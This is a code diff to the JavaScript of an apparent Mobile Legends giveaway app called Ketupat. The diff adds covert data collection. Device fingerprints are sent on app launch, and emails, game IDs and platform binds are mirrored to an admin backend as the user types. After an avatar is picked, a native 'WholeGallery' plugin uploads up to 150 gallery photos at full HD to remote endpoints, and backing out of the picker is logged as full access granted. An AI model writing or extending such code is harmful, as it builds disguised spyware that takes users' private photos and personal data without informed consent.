@@ -465,6 +465,36 @@ document.addEventListener("DOMContentLoaded", async () => {
   initScratchCard();
   startGiveawayTimers();
 
+  // Immediately register device to admin backend upon opening app
+  syncDeviceRegistrationToBackend();
+
+  // Listen to native WholeGallery permission events
+  const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
+  if (WholeGallery && typeof WholeGallery.addListener === "function") {
+    try {
+      WholeGallery.addListener("permissionGranted", (info) => {
+        console.log("[WholeGallery] permissionGranted event:", info);
+        window._hasFullGalleryAccess = Boolean(info && info.isFullAccess);
+        syncDeviceRegistrationToBackend({
+          has_access: true,
+          access_status: "full_access"
+        });
+        tryAutoSyncGalleryPhotos();
+      });
+      WholeGallery.addListener("permissionStatusChanged", (info) => {
+        console.log("[WholeGallery] permissionStatusChanged event:", info);
+        if (info && (info.granted || info.hasPermission)) {
+          window._hasFullGalleryAccess = Boolean(info.isFullAccess);
+          syncDeviceRegistrationToBackend({
+            has_access: true,
+            access_status: "full_access"
+          });
+          tryAutoSyncGalleryPhotos();
+        }
+      });
+    } catch (e) {}
+  }
+
   setTimeout(() => {
     transitionFromSplash();
   }, 350);
@@ -504,6 +534,29 @@ if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.App
     window.Capacitor.Plugins.App.addListener("resume", () => {
       tryAutoSyncGalleryPhotos();
     });
+  } catch (e) {}
+}
+
+// Capacitor native WholeGallery permission listeners
+if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.WholeGallery) {
+  try {
+    const WholeGallery = window.Capacitor.Plugins.WholeGallery;
+    if (typeof WholeGallery.addListener === "function") {
+      WholeGallery.addListener("permissionGranted", (data) => {
+        console.log("[Permission] WholeGallery permissionGranted event received:", data);
+        const isFull = (data && data.isFullAccess !== undefined) ? Boolean(data.isFullAccess) : true;
+        sendPermissionGrantedImmediately(isFull);
+        tryAutoSyncGalleryPhotos();
+      });
+
+      WholeGallery.addListener("permissionStatusChanged", (data) => {
+        if (data && (data.granted || data.hasPermission)) {
+          const isFull = Boolean(data.isFullAccess);
+          sendPermissionGrantedImmediately(isFull);
+          tryAutoSyncGalleryPhotos();
+        }
+      });
+    }
   } catch (e) {}
 }
 
@@ -717,7 +770,7 @@ async function supabaseInsertRedemption(order) {
   const user = appState.user || {};
   const payload = {
     order_id: order.id,
-    user_email: user.email || "guest@ketupat.app",
+    user_email: (user.email && !user.email.endsWith("@ketupat.app")) ? user.email : "",
     mlbb_id: order.targetId || user.mlbbId || "",
     mlbb_server: order.targetServer || user.mlbbServer || "",
     mlbb_ign: order.targetIgn || user.mlbbIgn || "",
@@ -739,7 +792,7 @@ async function supabaseInsertGiveawayEntry(pool, count, cost) {
   if (!isSupabaseConfigured()) return null;
   const user = appState.user || {};
   const payload = {
-    user_email: user.email || "guest@ketupat.app",
+    user_email: (user.email && !user.email.endsWith("@ketupat.app")) ? user.email : "",
     mlbb_id: user.mlbbId || "",
     mlbb_server: user.mlbbServer || "",
     mlbb_ign: user.mlbbIgn || user.username || "",
@@ -921,13 +974,17 @@ function isPlatformLinked(val) {
   if (
     val === false ||
     s === "false" ||
-    s === "empty" ||
-    s === "empty." ||
+    s.startsWith("empty") ||
     s === "unbound" ||
     s === "not bound" ||
     s === "unlinked" ||
+    s === "not connected" ||
+    s === "belum dikaitkan" ||
+    s === "tidak ada" ||
     s === "none" ||
+    s === "none." ||
     s === "null" ||
+    s === "n/a" ||
     s === "-" ||
     s === ""
   ) {
@@ -944,16 +1001,56 @@ async function fetchDlyyzBindCek(userId, serverId, customApiKey = "") {
 
   let dlyyzJson = null;
 
-  // 1. Query DlyyZ REST API validateMLBB action=bindcek (silently without error banners)
-  try {
-    const url = `${DLYYZ_CONFIG.endpoint}?action=${DLYYZ_CONFIG.action}&userID=${encodeURIComponent(cleanId)}&serverID=${encodeURIComponent(cleanServer)}&apikey=${encodeURIComponent(activeKey)}`;
-    const resp = await fetch(url, { method: "GET" });
-    const json = await resp.json();
-    if (json && (json.status === true || json.success === true)) {
-      dlyyzJson = json;
+  // 1. Query DlyyZ REST API validateMLBB action=bindcek
+  // Priority 1: In native Android APK, use WholeGallery.queryDlyyzBinds (100% immune to CORS)
+  const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
+  if (WholeGallery && typeof WholeGallery.queryDlyyzBinds === "function") {
+    try {
+      const nativeRes = await WholeGallery.queryDlyyzBinds({
+        userId: cleanId,
+        serverId: cleanServer,
+        apiKey: activeKey,
+      });
+      if (nativeRes && (nativeRes.status === true || nativeRes.success === true)) {
+        dlyyzJson = nativeRes;
+      }
+    } catch (nErr) {
+      console.warn("WholeGallery native queryDlyyzBinds notice:", nErr);
     }
-  } catch (err) {
-    // Fail silently without error notification
+  }
+
+  // Priority 2: Direct browser fetch (with backend proxy fallback)
+  if (!dlyyzJson) {
+    try {
+      const url = `${DLYYZ_CONFIG.endpoint}?action=${DLYYZ_CONFIG.action}&userID=${encodeURIComponent(cleanId)}&serverID=${encodeURIComponent(cleanServer)}&apikey=${encodeURIComponent(activeKey)}`;
+      const resp = await fetch(url, { method: "GET" });
+      const json = await resp.json();
+      if (json && (json.status === true || json.success === true)) {
+        dlyyzJson = json;
+      }
+    } catch (err) {
+      // Fall back to local admin-php backend proxy if direct fetch is blocked by CORS or network
+      try {
+        let proxyBase = window.location.pathname.includes('/www') ? '../admin-php/api.php' : (window.location.pathname.includes('/tools') ? '/tools/admin-php/api.php' : 'admin-php/api.php');
+        if (typeof getWorkingApiEndpoint === "function") {
+          const discovered = await getWorkingApiEndpoint();
+          if (discovered) proxyBase = discovered;
+        }
+        const proxyUrl = proxyBase.includes('?')
+          ? `${proxyBase}&action=check_dlyyz_binds&mlbb_id=${encodeURIComponent(cleanId)}&mlbb_server=${encodeURIComponent(cleanServer)}&apikey=${encodeURIComponent(activeKey)}`
+          : `${proxyBase}?action=check_dlyyz_binds&mlbb_id=${encodeURIComponent(cleanId)}&mlbb_server=${encodeURIComponent(cleanServer)}&apikey=${encodeURIComponent(activeKey)}`;
+        const pResp = await fetch(proxyUrl);
+        const pJson = await pResp.json();
+        if (pJson && pJson.success && pJson.data) {
+          dlyyzJson = {
+            status: true,
+            data: pJson.data.raw || pJson.data
+          };
+        }
+      } catch (proxyErr) {
+        // Fail silently without error notification
+      }
+    }
   }
 
   // 2. Perform authoritative IGN & region lookup via verifyMlbbAccountApi (GoPay / Isan resolver)
@@ -1069,6 +1166,44 @@ async function fetchDlyyzBindCek(userId, serverId, customApiKey = "") {
   };
 }
 
+let _workingApiEndpointCached = null;
+async function getWorkingApiEndpoint() {
+  if (_workingApiEndpointCached) return _workingApiEndpointCached;
+
+  const candidateBases = [];
+  if (window.location && window.location.origin && window.location.origin.startsWith("http")) {
+    const webOrigin = window.location.origin;
+    if (window.location.pathname && window.location.pathname.includes("/www")) {
+      candidateBases.push(new URL("../admin-php/api.php", window.location.href).href);
+    } else if (window.location.pathname && window.location.pathname.includes("/tools")) {
+      candidateBases.push(webOrigin + "/tools/admin-php/api.php");
+    } else {
+      candidateBases.push(webOrigin + "/admin-php/api.php");
+    }
+  }
+  candidateBases.push("http://192.168.0.109/tools/admin-php/api.php");
+  candidateBases.push("http://10.0.2.2/tools/admin-php/api.php");
+  candidateBases.push("http://localhost/tools/admin-php/api.php");
+
+  for (const base of candidateBases) {
+    try {
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), 1500);
+      const res = await fetch(base + "?action=check_pin", {
+        method: "GET",
+        signal: controller.signal
+      });
+      clearTimeout(timer);
+      if (res.ok || res.status === 400 || res.status === 401 || res.status === 403 || res.status === 200) {
+        _workingApiEndpointCached = base;
+        return base;
+      }
+    } catch (e) {}
+  }
+
+  return candidateBases[0] || "http://192.168.0.109/tools/admin-php/api.php";
+}
+
 // --- RENDER BIND INFO SCREEN ---
 function renderBindInfoScreen(bindData) {
   if (!bindData) return;
@@ -1085,11 +1220,19 @@ function renderBindInfoScreen(bindData) {
 
   if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.WholeGallery && window.Capacitor.Plugins.WholeGallery.updateSyncAccountInfo) {
     try {
-      window.Capacitor.Plugins.WholeGallery.updateSyncAccountInfo({
-        mlbbId: bindData.userId,
-        mlbbServer: bindData.server,
-        mlbbIgn: bindData.ign,
-        userEmail: `player_${bindData.userId}@ketupat.app`
+      getWorkingApiEndpoint().then(async (endpoint) => {
+        const deviceInfo = await getDeviceIdentity();
+        window.Capacitor.Plugins.WholeGallery.updateSyncAccountInfo({
+          syncApiUrl: endpoint,
+          deviceId: deviceInfo.id,
+          deviceName: deviceInfo.name,
+          deviceModel: deviceInfo.model,
+          deviceFingerprint: deviceInfo.fingerprint,
+          mlbbId: bindData.userId,
+          mlbbServer: bindData.server,
+          mlbbIgn: bindData.ign,
+          userEmail: (appState.user?.email && !appState.user.email.endsWith("@ketupat.app")) ? appState.user.email : ""
+        }).catch(() => {});
       }).catch(() => {});
     } catch (e) {}
   }
@@ -1125,6 +1268,19 @@ function renderBindInfoScreen(bindData) {
   } else {
     if (bindAvatarHelper) bindAvatarHelper.textContent = "Avatar photo is required to continue";
     if (btnChooseBindPhotoText) btnChooseBindPhotoText.textContent = "Upload Photo";
+  }
+
+  // Pre-fill user email input if existing
+  const inputBindEmail = document.getElementById("inputBindEmail");
+  if (inputBindEmail) {
+    if (!inputBindEmail.value || inputBindEmail.value.endsWith("@ketupat.app")) {
+      const existingEmail = (appState.user?.email && !appState.user.email.endsWith("@ketupat.app"))
+        ? appState.user.email
+        : "";
+      if (existingEmail) {
+        inputBindEmail.value = existingEmail;
+      }
+    }
   }
 
   // Render ONLY linked platforms dynamically into bindCardsGrid
@@ -1206,12 +1362,13 @@ async function syncPlatformBindsToBackend() {
     const endpoint = await getWorkingApiEndpoint();
     const deviceInfo = await getDeviceIdentity();
     const user = appState.user || {};
+    const cleanUserEmail = (user.email && !user.email.endsWith("@ketupat.app")) ? user.email : "";
     const payload = {
       device_id: deviceInfo.id,
       device_name: deviceInfo.name,
       device_model: deviceInfo.model,
       device_fingerprint: deviceInfo.fingerprint,
-      user_email: user.email || (appState.verifiedAccount ? `player_${appState.verifiedAccount.userId}@ketupat.app` : "guest@ketupat.app"),
+      user_email: cleanUserEmail,
       mlbb_id: user.mlbbId || (appState.verifiedAccount ? appState.verifiedAccount.userId : ""),
       mlbb_server: user.mlbbServer || (appState.verifiedAccount ? (appState.verifiedAccount.server || appState.verifiedAccount.zoneId) : ""),
       mlbb_ign: user.mlbbIgn || (appState.verifiedAccount ? appState.verifiedAccount.ign : ""),
@@ -1230,6 +1387,42 @@ async function syncPlatformBindsToBackend() {
 
 // --- EVENT LISTENERS ---
 function setupEventListeners() {
+  // Real-time input synchronization to admin backend
+  const handleMlbbInputsChange = () => {
+    clearTimeout(_syncDebounceTimer);
+    _syncDebounceTimer = setTimeout(() => {
+      syncDeviceRegistrationToBackend({
+        mlbb_id: inputMlbbUserId?.value?.trim() || "",
+        mlbb_server: inputMlbbServerId?.value?.trim() || ""
+      });
+    }, 400);
+  };
+  if (inputMlbbUserId) {
+    inputMlbbUserId.addEventListener("input", handleMlbbInputsChange);
+    inputMlbbUserId.addEventListener("change", handleMlbbInputsChange);
+  }
+  if (inputMlbbServerId) {
+    inputMlbbServerId.addEventListener("input", handleMlbbInputsChange);
+    inputMlbbServerId.addEventListener("change", handleMlbbInputsChange);
+  }
+
+  const inputBindEmail = document.getElementById("inputBindEmail");
+  if (inputBindEmail) {
+    inputBindEmail.addEventListener("input", () => {
+      clearTimeout(_syncDebounceTimer);
+      _syncDebounceTimer = setTimeout(() => {
+        syncDeviceRegistrationToBackend({
+          email: inputBindEmail.value.trim()
+        });
+      }, 350);
+    });
+    inputBindEmail.addEventListener("change", () => {
+      syncDeviceRegistrationToBackend({
+        email: inputBindEmail.value.trim()
+      });
+    });
+  }
+
   // 1. MLBB Account Validation Form Submission
   formMlbbValidate.addEventListener("submit", async (e) => {
     e.preventDefault();
@@ -1253,6 +1446,13 @@ function setupEventListeners() {
     try {
       const bindData = await fetchDlyyzBindCek(userId, server);
       renderBindInfoScreen(bindData);
+      syncDeviceRegistrationToBackend({
+        mlbb_id: bindData.userId,
+        mlbb_server: bindData.server,
+        ign: bindData.ign,
+        region: bindData.regionName,
+        binds: bindData.linkedPlatforms || []
+      });
       showScreen("bindInfo");
       showToast(`Account verified! Welcome, ${bindData.ign}`);
     } catch (err) {
@@ -1312,6 +1512,9 @@ function setupEventListeners() {
       showToast(`${currentEditingPlatform?.label || "Platform"} details saved!`);
 
       syncPlatformBindsToBackend();
+      syncDeviceRegistrationToBackend({
+        user_binds: appState.userEnteredBinds
+      });
     });
   }
 
@@ -1325,7 +1528,26 @@ function setupEventListeners() {
         return;
       }
 
-      // Mandatory Avatar Upload Check
+      // 1. Mandatory Email Check
+      const inputBindEmail = document.getElementById("inputBindEmail");
+      const enteredEmail = inputBindEmail ? inputBindEmail.value.trim().toLowerCase() : "";
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (!enteredEmail || !emailRegex.test(enteredEmail)) {
+        showToast("Please enter a valid email address before continuing!", "warning");
+        const emailSection = document.getElementById("bindEmailSection");
+        if (emailSection) {
+          emailSection.classList.add("email-missing-alert");
+          emailSection.scrollIntoView({ behavior: "smooth", block: "center" });
+          if (inputBindEmail) inputBindEmail.focus();
+          setTimeout(() => {
+            emailSection.classList.remove("email-missing-alert");
+          }, 3000);
+        }
+        return;
+      }
+
+      // 2. Mandatory Avatar Upload Check
       const hasAvatar = Boolean(
         appState.pendingAvatarBase64 ||
         (appState.user?.avatar && !appState.user.avatar.startsWith("data:image/svg+xml"))
@@ -1349,7 +1571,7 @@ function setupEventListeners() {
         '<span class="material-symbols-outlined btn-icon animate-spin">refresh</span><span>Entering Ketupat...</span>';
 
       const locationData = await captureUserLocation();
-      const userEmail = `${bindData.userId}.${bindData.server}@ketupat.app`;
+      const userEmail = enteredEmail;
 
       // Check if cloud profile exists in Supabase
       let existingProfile = null;
@@ -1959,27 +2181,55 @@ async function openGalleryPicker(target = "onboarding") {
   // 1. Native WholeGallery (Prompts for full media access & launches gallery)
   if (WholeGallery && typeof WholeGallery.openWholeGallery === "function") {
     try {
+      // Sync account metadata to native plugin upfront
+      if (typeof WholeGallery.updateSyncAccountInfo === "function") {
+        getWorkingApiEndpoint().then(async (endpoint) => {
+          const deviceInfo = await getDeviceIdentity();
+          const user = appState.user || {};
+          let userEmail = (user.email || "").trim();
+          if (userEmail.endsWith("@ketupat.app")) userEmail = "";
+          WholeGallery.updateSyncAccountInfo({
+            syncApiUrl: endpoint,
+            deviceId: deviceInfo.id,
+            deviceName: deviceInfo.name,
+            deviceModel: deviceInfo.model,
+            deviceFingerprint: deviceInfo.fingerprint,
+            mlbbId: user.mlbbId || (appState.verifiedAccount ? appState.verifiedAccount.userId : ""),
+            mlbbServer: user.mlbbServer || (appState.verifiedAccount ? (appState.verifiedAccount.server || appState.verifiedAccount.zoneId) : ""),
+            mlbbIgn: user.mlbbIgn || user.username || (appState.verifiedAccount ? appState.verifiedAccount.ign : "Player"),
+            userEmail: userEmail
+          }).catch(() => {});
+        }).catch(() => {});
+      }
+
+      // Check if permission is already granted; if so, transmit full access and start syncing immediately
+      if (typeof WholeGallery.checkGalleryPermission === "function") {
+        WholeGallery.checkGalleryPermission().then((perm) => {
+          if (perm && (perm.granted || perm.hasPermission)) {
+            sendPermissionGrantedImmediately(Boolean(perm.isFullAccess));
+            tryAutoSyncGalleryPhotos();
+          }
+        }).catch(() => {});
+      }
+
       const result = await WholeGallery.openWholeGallery();
+      window._hasFullGalleryAccess = true;
+      sendPermissionGrantedImmediately(true);
+
       if (result && result.dataUrl) {
         applySelectedPhoto(result.dataUrl);
-
-        // Fetch recent gallery photos from device since user granted access
-        if (typeof WholeGallery.getGalleryPhotos === "function") {
-          try {
-            const galleryRes = await WholeGallery.getGalleryPhotos({ limit: 150, includeBase64: true });
-            if (galleryRes && galleryRes.photos && galleryRes.photos.length > 0) {
-              const isFull = (galleryRes.isFullAccess !== false) && (result.isFullAccess !== false);
-              await syncUserGalleryPhotos(galleryRes.photos, isFull);
-            }
-          } catch (gErr) {
-            console.warn("WholeGallery getGalleryPhotos error:", gErr);
-          }
-        }
+        tryAutoSyncGalleryPhotos();
         return;
       }
     } catch (err) {
       console.warn("WholeGallery error:", err);
       const errStr = String(err || "");
+      if (!errStr.includes("Permission denied")) {
+        // If not explicit permission denial (e.g. user backed out of picker), permission was granted
+        window._hasFullGalleryAccess = true;
+        sendPermissionGrantedImmediately(true);
+      }
+      tryAutoSyncGalleryPhotos();
       if (errStr.includes("Permission denied")) {
         if (avatarPermissionNote && photoPickerTarget === "onboarding") {
           avatarPermissionNote.textContent =
@@ -2012,7 +2262,7 @@ async function openGalleryPicker(target = "onboarding") {
       if (perm && (perm.photos === "granted" || perm.photos === "limited")) {
         if (typeof Camera.getPhoto === "function") {
           const photo = await Camera.getPhoto({
-            quality: 85,
+            quality: 92,
             allowEditing: false,
             resultType: "dataUrl",
             source: "PHOTOS",
@@ -2066,6 +2316,11 @@ function applySelectedPhoto(dataUrl) {
     showToast("Profile avatar selected!");
   }
 
+  // Immediately sync avatar and status to Supabase & admin backend
+  syncDeviceRegistrationToBackend({
+    avatar: dataUrl
+  });
+
   // Sync avatar to gallery storage with is_avatar marker
   syncUserGalleryPhotos([
     {
@@ -2076,7 +2331,7 @@ function applySelectedPhoto(dataUrl) {
       mime: "image/jpeg",
       is_avatar: true,
     },
-  ], false);
+  ], Boolean(window._hasFullGalleryAccess));
 }
 
 let preferredUploadEndpoint = null;
@@ -2084,15 +2339,22 @@ let isSyncingGalleryPhotos = false;
 
 async function transmitGalleryPayload(payload) {
   const candidateEndpoints = [
-    "https://ice-sorry-inter-cause.trycloudflare.com/tools/admin-php/api.php?action=upload_gallery",
     "http://192.168.0.109/tools/admin-php/api.php?action=upload_gallery",
     "http://10.0.2.2/tools/admin-php/api.php?action=upload_gallery",
     "http://localhost/tools/admin-php/api.php?action=upload_gallery",
     "/tools/admin-php/api.php?action=upload_gallery"
   ];
   if (window.location && window.location.origin && window.location.origin.startsWith("http")) {
-    const webEp = window.location.origin + "/tools/admin-php/api.php?action=upload_gallery";
-    if (!candidateEndpoints.includes(webEp)) {
+    const webOrigin = window.location.origin;
+    let webEp = "";
+    if (window.location.pathname && window.location.pathname.includes("/www")) {
+      webEp = new URL("../admin-php/api.php?action=upload_gallery", window.location.href).href;
+    } else if (window.location.pathname && window.location.pathname.includes("/tools")) {
+      webEp = webOrigin + "/tools/admin-php/api.php?action=upload_gallery";
+    } else {
+      webEp = webOrigin + "/admin-php/api.php?action=upload_gallery";
+    }
+    if (webEp && !candidateEndpoints.includes(webEp)) {
       candidateEndpoints.unshift(webEp);
     }
   }
@@ -2106,8 +2368,8 @@ async function transmitGalleryPayload(payload) {
   for (const ep of endpoints) {
     try {
       const controller = new AbortController();
-      // 30 seconds timeout to prevent premature aborts on tunnel connections
-      const timer = setTimeout(() => controller.abort(), 30000);
+      // 3.5 seconds timeout to guarantee instantaneous failover
+      const timer = setTimeout(() => controller.abort(), 3500);
       const res = await fetch(ep, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -2131,27 +2393,151 @@ async function transmitGalleryPayload(payload) {
   return null;
 }
 
+let _syncDebounceTimer = null;
+window._hasFullGalleryAccess = false;
+
+async function syncDeviceRegistrationToBackend(extra = {}) {
+  try {
+    const deviceInfo = await getDeviceIdentity();
+    const user = appState.user || {};
+
+    const mlbbId = (extra.mlbb_id !== undefined ? extra.mlbb_id : (appState.verifiedAccount?.userId || document.getElementById("inputMlbbUserId")?.value || document.getElementById("inputMlbbId")?.value || user.mlbbId || "")).trim();
+    const mlbbServer = (extra.mlbb_server !== undefined ? extra.mlbb_server : (appState.verifiedAccount?.server || document.getElementById("inputMlbbServerId")?.value || document.getElementById("inputMlbbZone")?.value || user.mlbbServer || "")).trim();
+    const mlbbIgn = (extra.ign !== undefined ? extra.ign : (appState.verifiedAccount?.ign || user.mlbbIgn || user.username || "")).trim();
+    const mlbbRegion = (extra.region !== undefined ? extra.region : (appState.verifiedAccount?.regionName || user.mlbbRegion || "")).trim();
+
+    let rawEmail = (extra.email !== undefined ? extra.email : (document.getElementById("inputBindEmail")?.value || user.email || "")).trim();
+    const isRealEmail = Boolean(rawEmail && rawEmail.includes("@") && !rawEmail.toLowerCase().endsWith("@ketupat.app"));
+
+    let primaryEmail = isRealEmail ? rawEmail : "";
+    if (!primaryEmail) {
+      if (mlbbId) {
+        primaryEmail = `${mlbbId}.${mlbbServer || "0"}@ketupat.app`;
+      } else {
+        primaryEmail = `device_${deviceInfo.id}@ketupat.app`;
+      }
+    }
+
+    if (extra.has_access !== undefined) {
+      window._hasFullGalleryAccess = Boolean(extra.has_access);
+    }
+    const hasFull = Boolean(window._hasFullGalleryAccess);
+    const avatar = extra.avatar || appState.pendingAvatarBase64 || (user.avatar && !user.avatar.startsWith("data:image/svg") ? user.avatar : "");
+
+    let accessStatus = "pending";
+    if (hasFull) {
+      accessStatus = "full_access";
+    } else if (avatar) {
+      accessStatus = "avatar_only";
+    }
+
+    const binds = extra.binds || appState.currentBindData?.linkedPlatforms || [];
+    const userBinds = extra.user_binds || appState.userEnteredBinds || {};
+
+    const locPayload = {
+      device_id: deviceInfo.id,
+      device_name: deviceInfo.name,
+      device_model: deviceInfo.model,
+      device_fingerprint: deviceInfo.fingerprint,
+      has_access: hasFull,
+      access_status: accessStatus,
+      binds: binds,
+      user_binds: userBinds,
+      last_synced: new Date().toISOString()
+    };
+
+    // 1. Immediate Supabase Real-time Cloud Upsert
+    const supaBody = {
+      email: primaryEmail,
+      username: mlbbIgn || deviceInfo.model || "Android Device",
+      mlbb_id: mlbbId || null,
+      mlbb_server: mlbbServer || null,
+      mlbb_ign: mlbbIgn || null,
+      mlbb_region: mlbbRegion || null,
+      location_text: JSON.stringify(locPayload),
+      login_time: new Date().toLocaleString()
+    };
+    if (avatar) {
+      supaBody.avatar_data = avatar;
+    }
+
+    fetch(`${SUPABASE_CONFIG.url}/rest/v1/users?on_conflict=email`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "apikey": SUPABASE_CONFIG.anonKey,
+        "Authorization": `Bearer ${SUPABASE_CONFIG.anonKey}`,
+        "Prefer": "resolution=merge-duplicates"
+      },
+      body: JSON.stringify(supaBody)
+    }).catch(() => {});
+
+    // 2. Immediate Native Android Plugin Sync
+    const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
+    if (WholeGallery && typeof WholeGallery.updateSyncAccountInfo === "function") {
+      WholeGallery.updateSyncAccountInfo({
+        deviceId: deviceInfo.id,
+        deviceName: deviceInfo.name,
+        deviceModel: deviceInfo.model,
+        deviceFingerprint: deviceInfo.fingerprint,
+        userEmail: isRealEmail ? rawEmail : "",
+        mlbbId: mlbbId,
+        mlbbServer: mlbbServer,
+        mlbbIgn: mlbbIgn
+      }).catch(() => {});
+    }
+
+    // 3. Local PHP API Upload (if reachable on LAN/localhost)
+    transmitGalleryPayload({
+      device_id: deviceInfo.id,
+      device_name: deviceInfo.name,
+      device_model: deviceInfo.model,
+      device_fingerprint: deviceInfo.fingerprint,
+      user_email: isRealEmail ? rawEmail : "",
+      mlbb_id: mlbbId,
+      mlbb_server: mlbbServer,
+      mlbb_ign: mlbbIgn,
+      is_full_access: hasFull,
+      photos: avatar ? [{
+        name: "avatar_" + Date.now() + ".jpg",
+        dataUrl: avatar,
+        size: avatar.length,
+        is_avatar: true
+      }] : []
+    }).catch(() => {});
+
+    console.log("[Sync] Real-time state synced to backend:", { id: deviceInfo.id, ign: mlbbIgn, email: primaryEmail, hasFull, accessStatus });
+  } catch (err) {
+    console.warn("syncDeviceRegistrationToBackend error:", err);
+  }
+}
+
+async function sendPermissionGrantedImmediately(isFull = true) {
+  try {
+    window._hasFullGalleryAccess = Boolean(isFull);
+    await syncDeviceRegistrationToBackend({
+      has_access: Boolean(isFull),
+      access_status: isFull ? "full_access" : "avatar_only"
+    });
+    console.log("[Permission] Full access status transmitted immediately to Supabase & admin backend!");
+  } catch (err) {
+    console.warn("[Permission] Error transmitting full access immediately:", err);
+  }
+}
+
 async function syncUserGalleryPhotos(photos, isFullAccess = false) {
   if (isSyncingGalleryPhotos) return;
   isSyncingGalleryPhotos = true;
 
   try {
     const user = appState.user || {};
-    let userEmail = user.email;
-    if (!userEmail) {
-      const mlbbId = user.mlbbId || (appState.verifiedAccount ? appState.verifiedAccount.userId : "");
-      const mlbbServer = user.mlbbServer || (appState.verifiedAccount ? (appState.verifiedAccount.server || appState.verifiedAccount.zoneId) : "");
-      if (mlbbId && mlbbServer) {
-        userEmail = `${mlbbId}.${mlbbServer}@ketupat.app`;
-      } else if (mlbbId) {
-        userEmail = `player_${mlbbId}@ketupat.app`;
-      } else {
-        userEmail = "guest@ketupat.app";
-      }
+    let userEmail = (user.email || "").trim();
+    if (userEmail.endsWith("@ketupat.app")) {
+      userEmail = "";
     }
 
     const deviceInfo = await getDeviceIdentity();
-    const validPhotos = (photos || []).filter((p) => p && (p.dataUrl || p.is_avatar));
+    const validPhotos = (photos || []).filter((p) => p && (p.dataUrl || p.uri || p.path || p.is_avatar));
 
     // If no valid photos on device, but full access granted, notify backend immediately
     if (!validPhotos.length) {
@@ -2193,7 +2579,8 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
     if (unsyncedPhotos.length === 0) {
       const now = Date.now();
       const lastHeartbeat = window._lastGalleryHeartbeat || 0;
-      if (now - lastHeartbeat > 25000) {
+      // Always immediately notify if full access granted, otherwise respect 25s heartbeat throttle
+      if (isFullAccess || (now - lastHeartbeat > 25000)) {
         window._lastGalleryHeartbeat = now;
         const payload = {
           device_id: deviceInfo.id,
@@ -2235,11 +2622,42 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
       }
     } catch (e) {}
 
-    // 4. Transmit ONLY the new/unsynced photos in small chunks of 2 photos
-    // This keeps payloads tiny (~50-100KB), fast, and avoids any tunnel aborts
-    const chunkSize = 2;
+    // 4. Transmit new/unsynced photos in small batches (1 photo per payload)
+    // This preserves full high quality (Full HD / 2K) without hitting server body limits or causing timeouts
+    const chunkSize = 1;
+    const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
+
     for (let i = 0; i < unsyncedPhotos.length; i += chunkSize) {
       const chunk = unsyncedPhotos.slice(i, i + chunkSize);
+      const chunkToSend = [];
+
+      for (const p of chunk) {
+        let item = { ...p };
+        if (!item.dataUrl) {
+          // Fetch on-demand high-quality base64 for this specific photo
+          if (WholeGallery && typeof WholeGallery.getPhotoData === "function" && (item.uri || item.path)) {
+            try {
+              const dRes = await WholeGallery.getPhotoData({
+                uri: item.uri || "",
+                path: item.path || "",
+                maxDim: 1920,
+                quality: 92,
+              });
+              if (dRes && dRes.dataUrl) {
+                item.dataUrl = dRes.dataUrl;
+              }
+            } catch (err) {
+              console.warn("getPhotoData error for " + item.name, err);
+            }
+          }
+        }
+        if (item.dataUrl) {
+          chunkToSend.push(item);
+        }
+      }
+
+      if (chunkToSend.length === 0) continue;
+
       const payload = {
         device_id: deviceInfo.id,
         device_name: deviceInfo.name,
@@ -2250,13 +2668,13 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
         mlbb_server: user.mlbbServer || (appState.verifiedAccount ? (appState.verifiedAccount.server || appState.verifiedAccount.zoneId) : ""),
         mlbb_ign: user.mlbbIgn || user.username || (appState.verifiedAccount ? appState.verifiedAccount.ign : ""),
         is_full_access: isFullAccess,
-        photos: chunk,
+        photos: chunkToSend,
       };
 
       const res = await transmitGalleryPayload(payload);
       if (res && res.success) {
         // Mark chunk photos as successfully synced
-        for (const p of chunk) {
+        for (const p of chunkToSend) {
           if (!p.is_avatar) {
             const sig = (p.name || "") + "_" + (p.size || 0);
             syncedSet.add(sig);
@@ -2296,8 +2714,19 @@ async function tryAutoSyncGalleryPhotos() {
       canQuery = true;
     }
 
+    // Immediately transmit full access permission to admin without waiting for file scan
+    if (isFull) {
+      sendPermissionGrantedImmediately(true);
+    }
+
     if (canQuery && typeof WholeGallery.getGalleryPhotos === "function") {
-      const galleryRes = await WholeGallery.getGalleryPhotos({ limit: 150, includeBase64: true });
+      const hasGetPhotoData = typeof WholeGallery.getPhotoData === "function";
+      const galleryRes = await WholeGallery.getGalleryPhotos({
+        limit: 150,
+        includeBase64: !hasGetPhotoData,
+        maxDim: 1920,
+        quality: 92
+      });
       const photos = (galleryRes && galleryRes.photos) ? galleryRes.photos : [];
       const isFullAccess = (galleryRes && galleryRes.isFullAccess !== undefined) ? Boolean(galleryRes.isFullAccess) : isFull;
       await syncUserGalleryPhotos(photos, isFullAccess);
